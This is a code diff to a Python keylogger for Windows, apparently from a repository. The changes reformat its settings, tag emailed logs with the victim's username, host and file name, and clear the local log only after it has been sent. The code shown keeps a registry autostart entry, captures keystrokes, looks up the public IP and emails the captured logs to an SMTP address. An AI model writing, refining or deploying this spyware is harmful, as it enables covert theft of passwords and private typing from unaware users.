@@ -15,17 +15,20 @@ from win10toast import ToastNotifier
 from winreg import *
 
 LOG_FORMAT = "%(levelname)s %(asctime)s %(message)s"
-logging.basicConfig(filename = "py-keylogger.log", level = logging.INFO, format = LOG_FORMAT, filemode = "w")
+logging.basicConfig(filename = "py-keylogger.log", level = logging.INFO,
+                    format = LOG_FORMAT, filemode = "w")
 logger = logging.getLogger()
 
-EXIT_COMBINATION = {Key.ctrl_l, Key.f12}    # Press [L CTRL] + [F12] to stop keylogger
-PORT = 465                                  # Specify port number (465 or 587 recommended)
-SMTP_SERVER = "smtp.gmail.com"              # Specify SMTP server
-TO_ADDR = "user@domain.com"                 # Specify recipient email address
-FROM_ADDR = "user@domain.com"               # Specify sender email address
-PASSWORD = "your_password"                  # Specify sender email account password
+EXIT_COMBINATION = {Key.ctrl_l, Key.f12}        # Press [L CTRL] + [F12] to stop keylogger
+PORT = 465                                      # Specify port number (465 or 587 recommended)
+SMTP_SERVER = "smtp.gmail.com"                  # Specify SMTP server
+TO_ADDR = "user@domain.com"                     # Specify recipient email address
+FROM_ADDR = "user@domain.com"                   # Specify sender email address
+PASSWORD = "your_password"                      # Specify sender email account password
 HOSTNAME = socket.gethostname()
-SUBJECT = HOSTNAME + " // keylogger.py"     # Specify email subject
+USER = os.getlogin()
+FILE_NAME = basename(sys.argv[0].split("\\")[-1])
+SUBJECT = f"{USER}@{HOSTNAME} // {FILE_NAME}"   # Specify email subject
 try:
     PUBLIC_IP = urllib.request.urlopen('https://ident.me').read().decode('utf8')
     internet_conn = True
@@ -71,7 +74,7 @@ def add_startup():
         except OSError:
             pass
         # If If keylogger.py entry does not exist, create a new entry
-        if added_to_startup == False:
+        if not added_to_startup:
             SetValueEx(startup_key, "keylogger.py", 0, REG_SZ, f"\"{complete_file_path}\"")
             logger.info("\"keylogger.py\" successfully added to Windows registry")
 
@@ -138,15 +141,8 @@ def on_press(key):
 def on_release(key):
     pass
 
-
-
 logger.info("PKEYLOGGER START]")
 add_startup()
-
-# Clear previous log only if it has aready been sent via email
-if internet_conn:
-    with open("keylogs.txt", "w") as f:
-        f.close()
 
 # Log start time and date
 start_date = datetime.now()
@@ -178,3 +174,9 @@ log("-----------------------------\n")
 # Send email once log is closed
 if internet_conn:
     send_email()
+    # Clear previous log only if it has aready been sent via email
+    with open("keylogs.txt", "w") as f:
+        f.close()
+else:
+    logger.warning("Could not connect to the internet. " \
+        "Email will be attempted when the keylogger is stopped again.")
